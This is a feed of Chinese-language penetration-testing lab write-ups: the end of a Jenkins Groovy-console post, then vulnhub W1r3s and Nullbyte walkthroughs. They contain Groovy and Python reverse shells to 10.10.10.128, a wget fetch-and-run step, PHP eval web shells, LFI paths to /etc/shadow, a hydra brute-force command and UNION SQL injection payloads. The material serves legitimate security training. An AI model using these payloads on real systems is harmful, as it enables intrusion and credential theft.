class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Groovy"><span class="hljs-string">&quot;whoami&quot;</span>.execute().text;<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195345.png" alt="image.png"></p><blockquote><ol start="2"><li>修改文件：</li></ol></blockquote><blockquote><p>以本靶机来说，在用上述简单命令执行语句发现系统存在自动任务提权时，即可通过直接在此处修改任务文件一步get rootshell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195357.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy">java.nio.file.Files.write(java.nio.file.Paths.get(<span class="hljs-string">&quot;/etc/script/CleaningScript.sh&quot;</span>), <span class="hljs-string">&quot;\nbbb&quot;</span>.getBytes(), java.nio.file.StandardOpenOption.APPEND);<br><span class="hljs-string">&quot;cat /etc/script/CleaningScript.sh&quot;</span>.execute().text;<br></code></pre></td></tr></table></figure><blockquote><p>将APPEND替换为TRUNCATE_EXISTING可不用追加，直接覆盖</p></blockquote><blockquote><ol start="3"><li>创建新文件(写马)：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195407.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>).write(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>有写权限时即可写入</p></blockquote><blockquote><ol start="4"><li>反弹shell：</li></ol></blockquote><blockquote><p>使用groovy语句反弹shell：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Groovy">String host=<span class="hljs-string">&quot;10.10.10.128&quot;</span>;<br><span class="hljs-type">int</span> port=<span class="hljs-number">9999</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())<br>&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<br>    <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-keyword">try</span><br>&#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br><br></code></pre></td></tr></table></figure><blockquote><p>wget python文件反弹shell：</p></blockquote><blockquote><p>写python反弹脚本，wget到tmp下，再执行即可</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># This is a Python reverse shell script</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((<span class="hljs-string">&quot;10.10.10.128&quot;</span>,<span class="hljs-number">9999</span>));<br>os.dup2(s.fileno(),<span class="hljs-number">0</span>);<br>os.dup2(s.fileno(),<span class="hljs-number">1</span>);<br>os.dup2(s.fileno(),<span class="hljs-number">2</span>);<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-string">&quot;wget http://10.10.10.128:80/2.py -P /tmp/&quot;</span>.execute().text;<br><span class="hljs-string">&quot;cat /tmp/2.py&quot;</span>.execute().text ;<br><span class="hljs-comment">//&quot;python /tmp/2.py&quot;.execute().text ;</span><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195629.png" alt="image.png"></p><blockquote><p>去掉注释符执行，拿到shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195643.png" alt="image.png"></p><h3 id="新建任务"><a href="#新建任务" class="headerlink" title="新建任务"></a>新建任务</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195653.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195700.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195912.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195950.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200423.png" alt="image.png"><br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200428.png" alt="image.png"></p><h3 id="公开漏洞利用"><a href="#公开漏洞利用" class="headerlink" title="公开漏洞利用"></a>公开漏洞利用</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200449.png" alt="image.png"></p><blockquote><p>还有一个之前刚冲浪看到的新的CVE2024的RCE</p></blockquote><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.secpulse.com/archives/2166.html"># 知其一不知其二之Jenkins Hacking</a><br><a href="https://posts.careerengine.us/p/5ff2dba78a9c343551e94ea7"># Jenkins 漏洞利用</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub W1r3s1.0.1</title>
    <link href="/2024/03/27/W1r3s1.0.1/"/>
    <url>/2024/03/27/W1r3s1.0.1/</url>
    
    <content type="html"><![CDATA[<p>vulhub W1r3s1.0.1 walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191221.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191234.png" alt="image.png"></p><blockquote><p>排序： 80 web、21 ftp、3306 mysql、22 ssh</p></blockquote><blockquote><p>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191327.png" alt="image.png"></p><blockquote><p>ubuntu、mysql、apache、ftp存在匿名访问，考虑把ftp优先级提前到web前</p></blockquote><blockquote><p>脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191344.png" alt="image.png"></p><blockquote><p>扫到了wordpress登录页面，先记下来<br>还是准备先从ftp渗透开始</p></blockquote><h2 id="0x02-ftp渗透"><a href="#0x02-ftp渗透" class="headerlink" title="0x02 ftp渗透"></a>0x02 ftp渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191353.png" alt="image.png"></p><blockquote><p>匿名空密码登录，换binary模式，发现三个目录，其中的文件都可读，全部get下来</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191413.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191434.png" alt="image.png"></p><blockquote><p>02.txt 好像有些信息，先存下两个字符串</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191442.png" alt="image.png"></p><blockquote><p>employee给了员工信息<br>worktodo说 <code>I don&#39;t think this is the way to root</code>，不知道它想表达什么<br>先去处理刚刚的两个字符串：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191450.png" alt="image.png"></p><blockquote><p>一个md5，一个base64，解码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191459.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191507.png" alt="image.png"></p><blockquote><p>虽然他说不是密码，但还是先存下来<br>ftp渗透暂时应该结束了，转入web渗透：</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><blockquote><p>刚刚看到了有wordpress，先跑起gobuster目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191520.png" alt="image.png"></p><blockquote><p>唯一的收获就是有admin后台，但是301了<br>再跑下dirb的：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191537.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191616.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191739.png" alt="image.png"></p><blockquote><p>收获只有uploads路径可以访问</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191801.png" alt="image.png"></p><blockquote><p>web页面又是熟悉的ubuntu默认页面，省了不少事<br>可以直接去看wordpress登录界面了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191838.png" alt="image.png"></p><blockquote><p>查看源码发现了好像是wordpress的版本4.9.24</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191849.png" alt="image.png"></p><blockquote><p>尝试sql注入，不管输什么都会报无法连接：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191859.png" alt="image.png"></p><blockquote><p>很奇怪，为什么是跳转到了localhost？看源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191914.png" alt="image.png"></p><blockquote><p>果然是写死的跳转localhost<br>想了想好像也没有ssrf的点，突发奇想他的其他301页面可能也是这个逻辑，跳转到localhost，拿刚开始扫出来没管的administrator页面尝试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191929.png" alt="image.png"></p><blockquote><p>一试发现是直接转到了另一个有效页面，居然能直接访问到管理页面<br>当时一看到管理页面是301就想当然的以为跳转的目标是登录界面，导致走了不少弯路<br>那么就顺着新线索往下走：</p></blockquote><h3 id="cms公开漏洞利用"><a href="#cms公开漏洞利用" class="headerlink" title="cms公开漏洞利用"></a>cms公开漏洞利用</h3><blockquote><p>该页面暴露了：php配置文件可写、php版本、可文件上传、cms为cuppa<br>点next前往下一个页面：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191940.png" alt="image.png"></p><blockquote><p>暴露了：<br>mysql：root可能是空密码<br>管理员账户：admin@admin</p></blockquote><blockquote><p>尝试连接数据库：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192002.png" alt="image.png"></p><blockquote><p>尝试ssh：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192011.png" alt="image.png"></p><blockquote><p>没办法，接着next：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192018.png" alt="image.png"></p><blockquote><p>反复测注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192029.png" alt="image.png"></p><blockquote><p>毫无收获<br>虽然并未发现cuppa的版本，但也只能尝试一下公开漏洞利用了<br>(实在不行就只剩wordpress的孤公开漏洞利用这条路尝试了)</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192052.png" alt="image.png"></p><blockquote><p>在我们目前没有进到wordpress后台时，可能的利用只有25971(cuppa)和47690</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192102.png" alt="image.png"></p><blockquote><p>看文档好像是个未授权的洞，谷歌后发现也是需要登录后才可能的利用</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192111.png" alt="image.png"></p><blockquote><p>说这个页面写了可控的文件包含语句，尝试访问该页面：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192130.png" alt="image.png"></p><blockquote><p>没报404，有希望</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192139.png" alt="image.png"></p><blockquote><p>没包含到，但是因为是request接收，尝试同时传个post：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192146.png" alt="image.png"></p><h3 id="文件包含模糊测试"><a href="#文件包含模糊测试" class="headerlink" title="文件包含模糊测试"></a>文件包含模糊测试</h3><blockquote><p>包含成功了，尝试远程文件包含：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192157.png" alt="image.png"></p><blockquote><p>包含失败，应该是关掉了远程包含<br>尝试包含日志文件getshell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192204.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>error.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>error.log<br></code></pre></td></tr></table></figure><blockquote><p>测试了apache的几个常规日志路径，均失败<br>尝试data写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192230.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192239.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;hack.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br>data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>尝试data协议写马，失败<br>尝试包含ssh日志：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192251.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192258.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log/auth.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log/secure<br></code></pre></td></tr></table></figure><blockquote><p>测试常见路径包含ssh日志getshell失败<br>尝试UA写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192321.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/proc/</span>self/environ<br></code></pre></td></tr></table></figure><blockquote><p>又失败了，麻了，感觉可以放弃rce了<br>转回读文件，先读读web路径下的：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192331.png" alt="image.png"></p><blockquote><p>没有回显，可能是web路径错了，但是保险起见还是拿passwd试试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192339.png" alt="image.png"></p><blockquote><p>可以确定了，好像不能使用伪协议，也难怪前面的测试全都没用<br>从web路径拿配置文件这条路也断了<br>只能转回最开始的passwd看看了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192350.png" alt="image.png"></p><blockquote><p>密码也都隐藏了<br>根本没抱希望的包含了shadow文件，意外的发现居然配置错误，我们能访问：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192412.png" alt="image.png"></p><h3 id="shadow破解"><a href="#shadow破解" class="headerlink" title="shadow破解"></a>shadow破解</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192504.png" alt="image.png"></p><blockquote><p>passwd和shadow存下来，unshadow一下，john破解：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192525.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192534.png" alt="image.png"></p><blockquote><p>解出了www-data的密码，先尝试登录www-data：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192544.png" alt="image.png"></p><blockquote><p>发现可能是有每次ssh后直接断开的自动脚本，之后提权可以注意</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192553.png" alt="image.png"></p><blockquote><p>w1r3s的破解也成功了，这里应该已经可以结束了，毕竟不可能把root也让解出来<br>尝试登录到w1r3s：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192615.png" alt="image.png"></p><blockquote><p>拿到立足点</p></blockquote><h3 id="john历史记录问题"><a href="#john历史记录问题" class="headerlink" title="john历史记录问题"></a>john历史记录问题</h3><blockquote><p>被 john 破解过的hash会被存储在john.pot中，再次破解会报错：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192625.png" alt="image.png"></p><blockquote><p>解决方法：</p><ol><li>删除&#x2F;root&#x2F;.john&#x2F;john.pot的内容</li><li>使用<code>john --show &lt;文件名&gt;</code>查看历史记录（推荐）</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192633.png" alt="image.png"></p><h2 id="0x04-提权到root"><a href="#0x04-提权到root" class="headerlink" title="0x04 提权到root"></a>0x04 提权到root</h2><blockquote><p>刚准备开始提权坐牢，刚sudo枚举，发现是ALL：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192655.png" alt="image.png"></p><blockquote><p>拿到flag</p></blockquote><h2 id="0x05-反思补足"><a href="#0x05-反思补足" class="headerlink" title="0x05 反思补足"></a>0x05 反思补足</h2><blockquote><p>关于为什么测试的所有php伪协议均未成功：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192705.png" alt="image.png"></p><blockquote><p>该文件包含漏洞点已经写死了拼接的前半句路径，也就是为什么必须要目录穿越才能包含到的原因</p></blockquote><h2 id="0x06-看wp及视频后反思补足"><a href="#0x06-看wp及视频后反思补足" class="headerlink" title="0x06 看wp及视频后反思补足"></a>0x06 看wp及视频后反思补足</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><blockquote><ol><li>nmap全端口扫描时最好加入<code>-sT</code> 参数，以发送完整数据包</li></ol></blockquote><blockquote><ol start="2"><li>nmap -oA后，查看.nmap文件获得标准扫描结果</li></ol></blockquote><blockquote><ol start="3"><li>保险起见的udp扫描语句： <code>nmap -sU --top-ports 20 &lt;IP&gt;</code></li></ol></blockquote><blockquote><ol start="4"><li>所有路走不通时，必要时要考虑ipv6</li></ol></blockquote><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><blockquote><ol><li>prompt关闭交互，即不用每次选确定</li></ol></blockquote><blockquote><ol start="2"><li>mget *.txt 批量下载文件</li></ol></blockquote><h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><blockquote><ol><li>ascii generator可生成ascii组成的logo<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192715.png" alt="image.png"></li></ol></blockquote><blockquote><ol start="2"><li><code>echo -n &#39;&lt;string&gt;&#39; | md5sum</code> 可以md5编码</li></ol></blockquote><blockquote><ol start="3"><li>当发现cms存在公开漏洞时，甚至可以github等地查看源码，看代码逻辑</li></ol></blockquote><blockquote><ol start="4"><li>虽然此靶机ssh密码很弱，可以hydra爆破ssh登录达成秒杀，但打靶过程尽量不选择爆破ssh</li></ol></blockquote><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><ol><li>端口扫描：ftp匿名登录、web wordpress、ssh、mysql</li><li>ftp匿名登录 ：无有效信息</li><li>web渗透：与wordpress相关页面均跳转localhost判断行不通；目录爆破出管理后台cms，存在文件包含公开漏洞，测试各文件包含姿势后，目录穿越拿到shadow文件，破解出ssh密钥</li><li>提权：sudo ALL直接提权</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Nullbyte</title>
    <link href="/2024/03/24/Nullbyte/wp/"/>
    <url>/2024/03/24/Nullbyte/wp/</url>
    
    <content type="html"><![CDATA[<p>vulnhub Nullbyte walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/1.png" alt="1"></p></blockquote><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/2.png" alt="1"></p><blockquote><p>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/3.png" alt="1"></p><blockquote><p>从rpcinfo感觉可能需要用到udp端口，多扫下udp：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/4.png" alt="1"></p><blockquote><p>只开了rpcbind和一个网络配置服务(zeroconf)，看来无需udp</p></blockquote><blockquote><p>接着脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/5.png" alt="1"></p><blockquote><p>枚举出了phpmyadmin和uploads页面，思路转到web渗透</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>先打开目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/6.png" alt="1"></p><blockquote><p>访问web服务：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/7.png" alt="1"></p><blockquote><p>只有一个图片，先下载，等待目录爆破结果：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/8.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/9.png" alt="1"></p><blockquote><p>然而没什么新的有效信息，顺着访问phpmyadmin和uploads</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/10.png" alt="1"></p><blockquote><p>uploads说我们没有权限查看该目录的列表，但是推测可以通过&#x2F;uploads&#x2F;shell.php访问内容</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/11.png" alt="1"></p><blockquote><p>常规的登录界面，测试注入无果<br>线索只剩了main.gif，推测其中有信息隐写</p></blockquote><h3 id="exiftool查看图片信息"><a href="#exiftool查看图片信息" class="headerlink" title="exiftool查看图片信息"></a>exiftool查看图片信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool main.gif<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/12.png" alt="1"></p><blockquote><p>在图片详细信息中就发现了一段文字kzMb5nVYJw<br>先保存到hint.txt</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/13.png" alt="1"></p><blockquote><p>尝试直接做phpmyadmin登录、ssh登录，全部失败<br>尝试抓包对uploads目录直接上传文件，失败<br>尝试gif图片隐写检查，失败</p></blockquote><blockquote><p>突然突发奇想，ctf比赛时为了防止目录爆破经常起奇怪的文件名，尝试将这段文字当作路径，居然还真成功了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/14.png" alt="1"></p><blockquote><p>接着对着这个页面是一顿测注入，能测的都测了一遍，结果发现这页面不能执行sql语句，大概率就没连着数据库。就是一个单纯的验证key的界面，目前只能期望hydra爆破能走通了…</p></blockquote><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>参考：[[入门打靶 (5台wp)#hydra密码爆破]]</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/15.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.130 -s 80 http-post-form <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^&amp;ps=^USER^:invalid key&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>根据抓取的数据包构造以上爆破语句，用rockyou成功爆破出key<br>登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/16.png" alt="1"></p><blockquote><p>登录后终于来到有查询功能的页面，抓包开测注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/17.png" alt="1"></p><blockquote><p>确认存在sql注入，且是”型，测万能语句“or 1#</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/18.png" alt="1"></p><blockquote><p>测出列数为3：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/19.png" alt="1"></p><blockquote><p>尝试写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/20.png" alt="1"></p><blockquote><p>失败，可能是路径猜测错误，也可能是没有权限<br>老老实实查内容：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/21.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(schema_name) from information_schema.schemata#<br></code></pre></td></tr></table></figure><blockquote><p>两个库最感兴趣：phpmyadmin、seth<br>先查phpmyadmin：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(table_name) from information_schema.tables where table_schema=&#x27;phpmyadmin&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/22.png" alt="1"></p><blockquote><p>说实话看到这个前缀就感觉不会有什么有用信息，但保险起见还是看看这两个和user相关的表：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(column_name) from information_schema.columns where table_name=&#x27;pma_userconfig&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/23.png" 